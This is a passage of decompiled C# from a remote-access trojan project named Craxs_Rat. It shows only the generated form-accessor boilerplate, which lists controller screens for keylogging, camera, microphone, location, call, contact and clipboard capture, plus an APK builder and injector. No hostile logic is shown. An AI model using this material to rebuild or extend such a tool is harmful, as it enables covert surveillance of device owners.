using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat.My
{
	// Token: 0x02000005 RID: 5
	[GeneratedCode("MyTemplate", "11.0.0.0")]
	[HideModuleName]
	[StandardModule]
	internal sealed class MyProject
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x0600000A RID: 10 RVA: 0x000089D0 File Offset: 0x00006BD0
		[HelpKeyword("My.Computer")]
		internal static MyComputer Computer
		{
			get
			{
				return MyProject.m_ComputerObjectProvider.GetInstance;
			}
		}

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x0600000B RID: 11 RVA: 0x000089EC File Offset: 0x00006BEC
		[HelpKeyword("My.Application")]
		internal static MyApplication Application
		{
			get
			{
				return MyProject.m_AppObjectProvider.GetInstance;
			}
		}

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x0600000C RID: 12 RVA: 0x00008A08 File Offset: 0x00006C08
		[HelpKeyword("My.User")]
		internal static User User
		{
			get
			{
				return MyProject.m_UserObjectProvider.GetInstance;
			}
		}

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600000D RID: 13 RVA: 0x00008A24 File Offset: 0x00006C24
		[HelpKeyword("My.Forms")]
		internal static MyProject.MyForms Forms
		{
			get
			{
				return MyProject.m_MyFormsObjectProvider.GetInstance;
			}
		}

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600000E RID: 14 RVA: 0x00008A40 File Offset: 0x00006C40
		[HelpKeyword("My.WebServices")]
		internal static MyProject.MyWebServices WebServices
		{
			get
			{
				return MyProject.m_MyWebServicesObjectProvider.GetInstance;
			}
		}

		// Token: 0x04000002 RID: 2
		private static readonly MyProject.ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new MyProject.ThreadSafeObjectProvider<MyComputer>();

		// Token: 0x04000003 RID: 3
		private static readonly MyProject.ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new MyProject.ThreadSafeObjectProvider<MyApplication>();

		// Token: 0x04000004 RID: 4
		private static readonly MyProject.ThreadSafeObjectProvider<User> m_UserObjectProvider = new MyProject.ThreadSafeObjectProvider<User>();

		// Token: 0x04000005 RID: 5
		private static MyProject.ThreadSafeObjectProvider<MyProject.MyForms> m_MyFormsObjectProvider = new MyProject.ThreadSafeObjectProvider<MyProject.MyForms>();

		// Token: 0x04000006 RID: 6
		private static readonly MyProject.ThreadSafeObjectProvider<MyProject.MyWebServices> m_MyWebServicesObjectProvider = new MyProject.ThreadSafeObjectProvider<MyProject.MyWebServices>();

		// Token: 0x02000006 RID: 6
		[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal sealed class MyForms
		{
			// Token: 0x0600000F RID: 15 RVA: 0x00008A5C File Offset: 0x00006C5C
			[EditorBrowsable(EditorBrowsableState.Never)]
			public MyForms()
			{
			}

			// Token: 0x06000010 RID: 16 RVA: 0x00008A70 File Offset: 0x00006C70
			private static T Create__Instance__<T>(T Instance) where T : Form, new()
			{
				T result;
				if (Instance != null && !Instance.IsDisposed)
				{
					result = Instance;
				}
				else
				{
					if (MyProject.MyForms.m_FormBeingCreated != null)
					{
						if (MyProject.MyForms.m_FormBeingCreated.ContainsKey(typeof(T)))
						{
							throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate", new string[0]));
						}
					}
					else
					{
						MyProject.MyForms.m_FormBeingCreated = new Hashtable();
					}
					MyProject.MyForms.m_FormBeingCreated.Add(typeof(T), null);
					try
					{
						result = Activator.CreateInstance<T>();
					}
					catch (TargetInvocationException ex) when (ex.InnerException != null)
					{
						string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", new string[]
						{
							ex.InnerException.Message
						});
						throw new InvalidOperationException(resourceString, ex.InnerException);
					}
					finally
					{
						MyProject.MyForms.m_FormBeingCreated.Remove(typeof(T));
					}
				}
				return result;
			}

			// Token: 0x06000011 RID: 17 RVA: 0x000022C9 File Offset: 0x000004C9
			private void Dispose__Instance__<T>(ref T instance) where T : Form
			{
				instance.Dispose();
				instance = default(T);
			}

			// Token: 0x06000012 RID: 18 RVA: 0x000022DE File Offset: 0x000004DE
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override bool Equals(object obj)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(obj));
			}

			// Token: 0x06000013 RID: 19 RVA: 0x00008B78 File Offset: 0x00006D78
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			// Token: 0x06000014 RID: 20 RVA: 0x00008B90 File Offset: 0x00006D90
			[EditorBrowsable(EditorBrowsableState.Never)]
			internal new Type GetType()
			{
				return typeof(MyProject.MyForms);
			}

			// Token: 0x06000015 RID: 21 RVA: 0x00008BAC File Offset: 0x00006DAC
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override string ToString()
			{
				return base.ToString();
			}

			// Token: 0x17000006 RID: 6
			// (get) Token: 0x06000016 RID: 22 RVA: 0x00008BC4 File Offset: 0x00006DC4
			// (set) Token: 0x0600004D RID: 77 RVA: 0x00009380 File Offset: 0x00007580
			public AccountManager AccountManager
			{
				get
				{
					this.m_AccountManager = MyProject.MyForms.Create__Instance__<AccountManager>(this.m_AccountManager);
					return this.m_AccountManager;
				}
				set
				{
					if (value != this.m_AccountManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<AccountManager>(ref this.m_AccountManager);
					}
				}
			}

			// Token: 0x17000007 RID: 7
			// (get) Token: 0x06000017 RID: 23 RVA: 0x00008BE8 File Offset: 0x00006DE8
			// (set) Token: 0x0600004E RID: 78 RVA: 0x000093B8 File Offset: 0x000075B8
			public AddNumber AddNumber
			{
				get
				{
					this.m_AddNumber = MyProject.MyForms.Create__Instance__<AddNumber>(this.m_AddNumber);
					return this.m_AddNumber;
				}
				set
				{
					if (value != this.m_AddNumber)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<AddNumber>(ref this.m_AddNumber);
					}
				}
			}

			// Token: 0x17000008 RID: 8
			// (get) Token: 0x06000018 RID: 24 RVA: 0x00008C0C File Offset: 0x00006E0C
			// (set) Token: 0x0600004F RID: 79 RVA: 0x000093F0 File Offset: 0x000075F0
			public Applications Applications
			{
				get
				{
					this.m_Applications = MyProject.MyForms.Create__Instance__<Applications>(this.m_Applications);
					return this.m_Applications;
				}
				set
				{
					if (value != this.m_Applications)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Applications>(ref this.m_Applications);
					}
				}
			}

			// Token: 0x17000009 RID: 9
			// (get) Token: 0x06000019 RID: 25 RVA: 0x00008C30 File Offset: 0x00006E30
			// (set) Token: 0x06000050 RID: 80 RVA: 0x00009428 File Offset: 0x00007628
			public AppsProperties AppsProperties
			{
				get
				{
					this.m_AppsProperties = MyProject.MyForms.Create__Instance__<AppsProperties>(this.m_AppsProperties);
					return this.m_AppsProperties;
				}
				set
				{
					if (value != this.m_AppsProperties)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<AppsProperties>(ref this.m_AppsProperties);
					}
				}
			}

			// Token: 0x1700000A RID: 10
			// (get) Token: 0x0600001A RID: 26 RVA: 0x00008C54 File Offset: 0x00006E54
			// (set) Token: 0x06000051 RID: 81 RVA: 0x00009460 File Offset: 0x00007660
			public Auto_Clicker Auto_Clicker
			{
				get
				{
					this.m_Auto_Clicker = MyProject.MyForms.Create__Instance__<Auto_Clicker>(this.m_Auto_Clicker);
					return this.m_Auto_Clicker;
				}
				set
				{
					if (value != this.m_Auto_Clicker)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Auto_Clicker>(ref this.m_Auto_Clicker);
					}
				}
			}

			// Token: 0x1700000B RID: 11
			// (get) Token: 0x0600001B RID: 27 RVA: 0x00008C78 File Offset: 0x00006E78
			// (set) Token: 0x06000052 RID: 82 RVA: 0x00009498 File Offset: 0x00007698
			public Build Build
			{
				get
				{
					this.m_Build = MyProject.MyForms.Create__Instance__<Build>(this.m_Build);
					return this.m_Build;
				}
				set
				{
					if (value != this.m_Build)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Build>(ref this.m_Build);
					}
				}
			}

			// Token: 0x1700000C RID: 12
			// (get) Token: 0x0600001C RID: 28 RVA: 0x00008C9C File Offset: 0x00006E9C
			// (set) Token: 0x06000053 RID: 83 RVA: 0x000094D0 File Offset: 0x000076D0
			public CallPhone CallPhone
			{
				get
				{
					this.m_CallPhone = MyProject.MyForms.Create__Instance__<CallPhone>(this.m_CallPhone);
					return this.m_CallPhone;
				}
				set
				{
					if (value != this.m_CallPhone)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CallPhone>(ref this.m_CallPhone);
					}
				}
			}

			// Token: 0x1700000D RID: 13
			// (get) Token: 0x0600001D RID: 29 RVA: 0x00008CC0 File Offset: 0x00006EC0
			// (set) Token: 0x06000054 RID: 84 RVA: 0x00009508 File Offset: 0x00007708
			public Calls_Records Calls_Records
			{
				get
				{
					this.m_Calls_Records = MyProject.MyForms.Create__Instance__<Calls_Records>(this.m_Calls_Records);
					return this.m_Calls_Records;
				}
				set
				{
					if (value != this.m_Calls_Records)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Calls_Records>(ref this.m_Calls_Records);
					}
				}
			}

			// Token: 0x1700000E RID: 14
			// (get) Token: 0x0600001E RID: 30 RVA: 0x00008CE4 File Offset: 0x00006EE4
			// (set) Token: 0x06000055 RID: 85 RVA: 0x00009540 File Offset: 0x00007740
			public CallsManager CallsManager
			{
				get
				{
					this.m_CallsManager = MyProject.MyForms.Create__Instance__<CallsManager>(this.m_CallsManager);
					return this.m_CallsManager;
				}
				set
				{
					if (value != this.m_CallsManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CallsManager>(ref this.m_CallsManager);
					}
				}
			}

			// Token: 0x1700000F RID: 15
			// (get) Token: 0x0600001F RID: 31 RVA: 0x00008D08 File Offset: 0x00006F08
			// (set) Token: 0x06000056 RID: 86 RVA: 0x00009578 File Offset: 0x00007778
			public CameraManager CameraManager
			{
				get
				{
					this.m_CameraManager = MyProject.MyForms.Create__Instance__<CameraManager>(this.m_CameraManager);
					return this.m_CameraManager;
				}
				set
				{
					if (value != this.m_CameraManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CameraManager>(ref this.m_CameraManager);
					}
				}
			}

			// Token: 0x17000010 RID: 16
			// (get) Token: 0x06000020 RID: 32 RVA: 0x00008D2C File Offset: 0x00006F2C
			// (set) Token: 0x06000057 RID: 87 RVA: 0x000095B0 File Offset: 0x000077B0
			public ClipboardManager ClipboardManager
			{
				get
				{
					this.m_ClipboardManager = MyProject.MyForms.Create__Instance__<ClipboardManager>(this.m_ClipboardManager);
					return this.m_ClipboardManager;
				}
				set
				{
					if (value != this.m_ClipboardManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ClipboardManager>(ref this.m_ClipboardManager);
					}
				}
			}

			// Token: 0x17000011 RID: 17
			// (get) Token: 0x06000021 RID: 33 RVA: 0x00008D50 File Offset: 0x00006F50
			// (set) Token: 0x06000058 RID: 88 RVA: 0x000095E8 File Offset: 0x000077E8
			public Color_Box0 Color_Box0
			{
				get
				{
					this.m_Color_Box0 = MyProject.MyForms.Create__Instance__<Color_Box0>(this.m_Color_Box0);
					return this.m_Color_Box0;
				}
				set
				{
					if (value != this.m_Color_Box0)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Color_Box0>(ref this.m_Color_Box0);
					}
				}
			}

			// Token: 0x17000012 RID: 18
			// (get) Token: 0x06000022 RID: 34 RVA: 0x00008D74 File Offset: 0x00006F74
			// (set) Token: 0x06000059 RID: 89 RVA: 0x00009620 File Offset: 0x00007820
			public ContactsManager ContactsManager
			{
				get
				{
					this.m_ContactsManager = MyProject.MyForms.Create__Instance__<ContactsManager>(this.m_ContactsManager);
					return this.m_ContactsManager;
				}
				set
				{
					if (value != this.m_ContactsManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ContactsManager>(ref this.m_ContactsManager);
					}
				}
			}

			// Token: 0x17000013 RID: 19
			// (get) Token: 0x06000023 RID: 35 RVA: 0x00008D98 File Offset: 0x00006F98
			// (set) Token: 0x0600005A RID: 90 RVA: 0x00009658 File Offset: 0x00007858
			public CraxsAbout CraxsAbout
			{
				get
				{
					this.m_CraxsAbout = MyProject.MyForms.Create__Instance__<CraxsAbout>(this.m_CraxsAbout);
					return this.m_CraxsAbout;
				}
				set
				{
					if (value != this.m_CraxsAbout)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CraxsAbout>(ref this.m_CraxsAbout);
					}
				}
			}

			// Token: 0x17000014 RID: 20
			// (get) Token: 0x06000024 RID: 36 RVA: 0x00008DBC File Offset: 0x00006FBC
			// (set) Token: 0x0600005B RID: 91 RVA: 0x00009690 File Offset: 0x00007890
			public craxscallslog craxscallslog
			{
				get
				{
					this.m_craxscallslog = MyProject.MyForms.Create__Instance__<craxscallslog>(this.m_craxscallslog);
					return this.m_craxscallslog;
				}
				set
				{
					if (value != this.m_craxscallslog)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<craxscallslog>(ref this.m_craxscallslog);
					}
				}
			}

			// Token: 0x17000015 RID: 21
			// (get) Token: 0x06000025 RID: 37 RVA: 0x00008DE0 File Offset: 0x00006FE0
			// (set) Token: 0x0600005C RID: 92 RVA: 0x000096C8 File Offset: 0x000078C8
			public craxsnotification craxsnotification
			{
				get
				{
					this.m_craxsnotification = MyProject.MyForms.Create__Instance__<craxsnotification>(this.m_craxsnotification);
					return this.m_craxsnotification;
				}
				set
				{
					if (value != this.m_craxsnotification)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<craxsnotification>(ref this.m_craxsnotification);
					}
				}
			}

			// Token: 0x17000016 RID: 22
			// (get) Token: 0x06000026 RID: 38 RVA: 0x00008E04 File Offset: 0x00007004
			// (set) Token: 0x0600005D RID: 93 RVA: 0x00009700 File Offset: 0x00007900
			public CraxsSettings CraxsSettings
			{
				get
				{
					this.m_CraxsSettings = MyProject.MyForms.Create__Instance__<CraxsSettings>(this.m_CraxsSettings);
					return this.m_CraxsSettings;
				}
				set
				{
					if (value != this.m_CraxsSettings)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CraxsSettings>(ref this.m_CraxsSettings);
					}
				}
			}

			// Token: 0x17000017 RID: 23
			// (get) Token: 0x06000027 RID: 39 RVA: 0x00008E28 File Offset: 0x00007028
			// (set) Token: 0x0600005E RID: 94 RVA: 0x00009738 File Offset: 0x00007938
			public CraxsStore CraxsStore
			{
				get
				{
					this.m_CraxsStore = MyProject.MyForms.Create__Instance__<CraxsStore>(this.m_CraxsStore);
					return this.m_CraxsStore;
				}
				set
				{
					if (value != this.m_CraxsStore)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CraxsStore>(ref this.m_CraxsStore);
					}
				}
			}

			// Token: 0x17000018 RID: 24
			// (get) Token: 0x06000028 RID: 40 RVA: 0x00008E4C File Offset: 0x0000704C
			// (set) Token: 0x0600005F RID: 95 RVA: 0x00009770 File Offset: 0x00007970
			public CypherRat CypherRat
			{
				get
				{
					this.m_CypherRat = MyProject.MyForms.Create__Instance__<CypherRat>(this.m_CypherRat);
					return this.m_CypherRat;
				}
				set
				{
					if (value != this.m_CypherRat)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<CypherRat>(ref this.m_CypherRat);
					}
				}
			}

			// Token: 0x17000019 RID: 25
			// (get) Token: 0x06000029 RID: 41 RVA: 0x00008E70 File Offset: 0x00007070
			// (set) Token: 0x06000060 RID: 96 RVA: 0x000097A8 File Offset: 0x000079A8
			public dia dia
			{
				get
				{
					this.m_dia = MyProject.MyForms.Create__Instance__<dia>(this.m_dia);
					return this.m_dia;
				}
				set
				{
					if (value != this.m_dia)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<dia>(ref this.m_dia);
					}
				}
			}

			// Token: 0x1700001A RID: 26
			// (get) Token: 0x0600002A RID: 42 RVA: 0x00008E94 File Offset: 0x00007094
			// (set) Token: 0x06000061 RID: 97 RVA: 0x000097E0 File Offset: 0x000079E0
			public Dialog1 Dialog1
			{
				get
				{
					this.m_Dialog1 = MyProject.MyForms.Create__Instance__<Dialog1>(this.m_Dialog1);
					return this.m_Dialog1;
				}
				set
				{
					if (value != this.m_Dialog1)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Dialog1>(ref this.m_Dialog1);
					}
				}
			}

			// Token: 0x1700001B RID: 27
			// (get) Token: 0x0600002B RID: 43 RVA: 0x00008EB8 File Offset: 0x000070B8
			// (set) Token: 0x06000062 RID: 98 RVA: 0x00009818 File Offset: 0x00007A18
			public Dialog2 Dialog2
			{
				get
				{
					this.m_Dialog2 = MyProject.MyForms.Create__Instance__<Dialog2>(this.m_Dialog2);
					return this.m_Dialog2;
				}
				set
				{
					if (value != this.m_Dialog2)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Dialog2>(ref this.m_Dialog2);
					}
				}
			}

			// Token: 0x1700001C RID: 28
			// (get) Token: 0x0600002C RID: 44 RVA: 0x00008EDC File Offset: 0x000070DC
			// (set) Token: 0x06000063 RID: 99 RVA: 0x00009850 File Offset: 0x00007A50
			public DialogPloice DialogPloice
			{
				get
				{
					this.m_DialogPloice = MyProject.MyForms.Create__Instance__<DialogPloice>(this.m_DialogPloice);
					return this.m_DialogPloice;
				}
				set
				{
					if (value != this.m_DialogPloice)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<DialogPloice>(ref this.m_DialogPloice);
					}
				}
			}

			// Token: 0x1700001D RID: 29
			// (get) Token: 0x0600002D RID: 45 RVA: 0x00008F00 File Offset: 0x00007100
			// (set) Token: 0x06000064 RID: 100 RVA: 0x00009888 File Offset: 0x00007A88
			public Download Download
			{
				get
				{
					this.m_Download = MyProject.MyForms.Create__Instance__<Download>(this.m_Download);
					return this.m_Download;
				}
				set
				{
					if (value != this.m_Download)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Download>(ref this.m_Download);
					}
				}
			}

			// Token: 0x1700001E RID: 30
			// (get) Token: 0x0600002E RID: 46 RVA: 0x00008F24 File Offset: 0x00007124
			// (set) Token: 0x06000065 RID: 101 RVA: 0x000098C0 File Offset: 0x00007AC0
			public Editor Editor
			{
				get
				{
					this.m_Editor = MyProject.MyForms.Create__Instance__<Editor>(this.m_Editor);
					return this.m_Editor;
				}
				set
				{
					if (value != this.m_Editor)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Editor>(ref this.m_Editor);
					}
				}
			}

			// Token: 0x1700001F RID: 31
			// (get) Token: 0x0600002F RID: 47 RVA: 0x00008F48 File Offset: 0x00007148
			// (set) Token: 0x06000066 RID: 102 RVA: 0x000098F8 File Offset: 0x00007AF8
			public EditSocket EditSocket
			{
				get
				{
					this.m_EditSocket = MyProject.MyForms.Create__Instance__<EditSocket>(this.m_EditSocket);
					return this.m_EditSocket;
				}
				set
				{
					if (value != this.m_EditSocket)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<EditSocket>(ref this.m_EditSocket);
					}
				}
			}

			// Token: 0x17000020 RID: 32
			// (get) Token: 0x06000030 RID: 48 RVA: 0x00008F6C File Offset: 0x0000716C
			// (set) Token: 0x06000067 RID: 103 RVA: 0x00009930 File Offset: 0x00007B30
			public Faker Faker
			{
				get
				{
					this.m_Faker = MyProject.MyForms.Create__Instance__<Faker>(this.m_Faker);
					return this.m_Faker;
				}
				set
				{
					if (value != this.m_Faker)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Faker>(ref this.m_Faker);
					}
				}
			}

			// Token: 0x17000021 RID: 33
			// (get) Token: 0x06000031 RID: 49 RVA: 0x00008F90 File Offset: 0x00007190
			// (set) Token: 0x06000068 RID: 104 RVA: 0x00009968 File Offset: 0x00007B68
			public FileManager FileManager
			{
				get
				{
					this.m_FileManager = MyProject.MyForms.Create__Instance__<FileManager>(this.m_FileManager);
					return this.m_FileManager;
				}
				set
				{
					if (value != this.m_FileManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<FileManager>(ref this.m_FileManager);
					}
				}
			}

			// Token: 0x17000022 RID: 34
			// (get) Token: 0x06000032 RID: 50 RVA: 0x00008FB4 File Offset: 0x000071B4
			// (set) Token: 0x06000069 RID: 105 RVA: 0x000099A0 File Offset: 0x00007BA0
			public Icons Icons
			{
				get
				{
					this.m_Icons = MyProject.MyForms.Create__Instance__<Icons>(this.m_Icons);
					return this.m_Icons;
				}
				set
				{
					if (value != this.m_Icons)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Icons>(ref this.m_Icons);
					}
				}
			}

			// Token: 0x17000023 RID: 35
			// (get) Token: 0x06000033 RID: 51 RVA: 0x00008FD8 File Offset: 0x000071D8
			// (set) Token: 0x0600006A RID: 106 RVA: 0x000099D8 File Offset: 0x00007BD8
			public information information
			{
				get
				{
					this.m_information = MyProject.MyForms.Create__Instance__<information>(this.m_information);
					return this.m_information;
				}
				set
				{
					if (value != this.m_information)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<information>(ref this.m_information);
					}
				}
			}

			// Token: 0x17000024 RID: 36
			// (get) Token: 0x06000034 RID: 52 RVA: 0x00008FFC File Offset: 0x000071FC
			// (set) Token: 0x0600006B RID: 107 RVA: 0x00009A10 File Offset: 0x00007C10
			public inp inp
			{
				get
				{
					this.m_inp = MyProject.MyForms.Create__Instance__<inp>(this.m_inp);
					return this.m_inp;
				}
				set
				{
					if (value != this.m_inp)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<inp>(ref this.m_inp);
					}
				}
			}

			// Token: 0x17000025 RID: 37
			// (get) Token: 0x06000035 RID: 53 RVA: 0x00009020 File Offset: 0x00007220
			// (set) Token: 0x0600006C RID: 108 RVA: 0x00009A48 File Offset: 0x00007C48
			public Jector Jector
			{
				get
				{
					this.m_Jector = MyProject.MyForms.Create__Instance__<Jector>(this.m_Jector);
					return this.m_Jector;
				}
				set
				{
					if (value != this.m_Jector)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Jector>(ref this.m_Jector);
					}
				}
			}

			// Token: 0x17000026 RID: 38
			// (get) Token: 0x06000036 RID: 54 RVA: 0x00009044 File Offset: 0x00007244
			// (set) Token: 0x0600006D RID: 109 RVA: 0x00009A80 File Offset: 0x00007C80
			public KeyboardManager KeyboardManager
			{
				get
				{
					this.m_KeyboardManager = MyProject.MyForms.Create__Instance__<KeyboardManager>(this.m_KeyboardManager);
					return this.m_KeyboardManager;
				}
				set
				{
					if (value != this.m_KeyboardManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<KeyboardManager>(ref this.m_KeyboardManager);
					}
				}
			}

			// Token: 0x17000027 RID: 39
			// (get) Token: 0x06000037 RID: 55 RVA: 0x00009068 File Offset: 0x00007268
			// (set) Token: 0x0600006E RID: 110 RVA: 0x00009AB8 File Offset: 0x00007CB8
			public Keylogger Keylogger
			{
				get
				{
					this.m_Keylogger = MyProject.MyForms.Create__Instance__<Keylogger>(this.m_Keylogger);
					return this.m_Keylogger;
				}
				set
				{
					if (value != this.m_Keylogger)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Keylogger>(ref this.m_Keylogger);
					}
				}
			}

			// Token: 0x17000028 RID: 40
			// (get) Token: 0x06000038 RID: 56 RVA: 0x0000908C File Offset: 0x0000728C
			// (set) Token: 0x0600006F RID: 111 RVA: 0x00009AF0 File Offset: 0x00007CF0
			public LanguageSelector LanguageSelector
			{
				get
				{
					this.m_LanguageSelector = MyProject.MyForms.Create__Instance__<LanguageSelector>(this.m_LanguageSelector);
					return this.m_LanguageSelector;
				}
				set
				{
					if (value != this.m_LanguageSelector)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<LanguageSelector>(ref this.m_LanguageSelector);
					}
				}
			}

			// Token: 0x17000029 RID: 41
			// (get) Token: 0x06000039 RID: 57 RVA: 0x000090B0 File Offset: 0x000072B0
			// (set) Token: 0x06000070 RID: 112 RVA: 0x00009B28 File Offset: 0x00007D28
			public LocationManager LocationManager
			{
				get
				{
					this.m_LocationManager = MyProject.MyForms.Create__Instance__<LocationManager>(this.m_LocationManager);
					return this.m_LocationManager;
				}
				set
				{
					if (value != this.m_LocationManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<LocationManager>(ref this.m_LocationManager);
					}
				}
			}

			// Token: 0x1700002A RID: 42
			// (get) Token: 0x0600003A RID: 58 RVA: 0x000090D4 File Offset: 0x000072D4
			// (set) Token: 0x06000071 RID: 113 RVA: 0x00009B60 File Offset: 0x00007D60
			public Microphone Microphone
			{
				get
				{
					this.m_Microphone = MyProject.MyForms.Create__Instance__<Microphone>(this.m_Microphone);
					return this.m_Microphone;
				}
				set
				{
					if (value != this.m_Microphone)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Microphone>(ref this.m_Microphone);
					}
				}
			}

			// Token: 0x1700002B RID: 43
			// (get) Token: 0x0600003B RID: 59 RVA: 0x000090F8 File Offset: 0x000072F8
			// (set) Token: 0x06000072 RID: 114 RVA: 0x00009B98 File Offset: 0x00007D98
			public nonetform nonetform
			{
				get
				{
					this.m_nonetform = MyProject.MyForms.Create__Instance__<nonetform>(this.m_nonetform);
					return this.m_nonetform;
				}
				set
				{
					if (value != this.m_nonetform)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<nonetform>(ref this.m_nonetform);
					}
				}
			}

			// Token: 0x1700002C RID: 44
			// (get) Token: 0x0600003C RID: 60 RVA: 0x0000911C File Offset: 0x0000731C
			// (set) Token: 0x06000073 RID: 115 RVA: 0x00009BD0 File Offset: 0x00007DD0
			public PermissionsManager PermissionsManager
			{
				get
				{
					this.m_PermissionsManager = MyProject.MyForms.Create__Instance__<PermissionsManager>(this.m_PermissionsManager);
					return this.m_PermissionsManager;
				}
				set
				{
					if (value != this.m_PermissionsManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<PermissionsManager>(ref this.m_PermissionsManager);
					}
				}
			}

			// Token: 0x1700002D RID: 45
			// (get) Token: 0x0600003D RID: 61 RVA: 0x00009140 File Offset: 0x00007340
			// (set) Token: 0x06000074 RID: 116 RVA: 0x00009C08 File Offset: 0x00007E08
			public Ports Ports
			{
				get
				{
					this.m_Ports = MyProject.MyForms.Create__Instance__<Ports>(this.m_Ports);
					return this.m_Ports;
				}
				set
				{
					if (value != this.m_Ports)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Ports>(ref this.m_Ports);
					}
				}
			}

			// Token: 0x1700002E RID: 46
			// (get) Token: 0x0600003E RID: 62 RVA: 0x00009164 File Offset: 0x00007364
			// (set) Token: 0x06000075 RID: 117 RVA: 0x00009C40 File Offset: 0x00007E40
			public Report Report
			{
				get
				{
					this.m_Report = MyProject.MyForms.Create__Instance__<Report>(this.m_Report);
					return this.m_Report;
				}
				set
				{
					if (value != this.m_Report)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Report>(ref this.m_Report);
					}
				}
			}

			// Token: 0x1700002F RID: 47
			// (get) Token: 0x0600003F RID: 63 RVA: 0x00009188 File Offset: 0x00007388
			// (set) Token: 0x06000076 RID: 118 RVA: 0x00009C78 File Offset: 0x00007E78
			public requestapk requestapk
			{
				get
				{
					this.m_requestapk = MyProject.MyForms.Create__Instance__<requestapk>(this.m_requestapk);
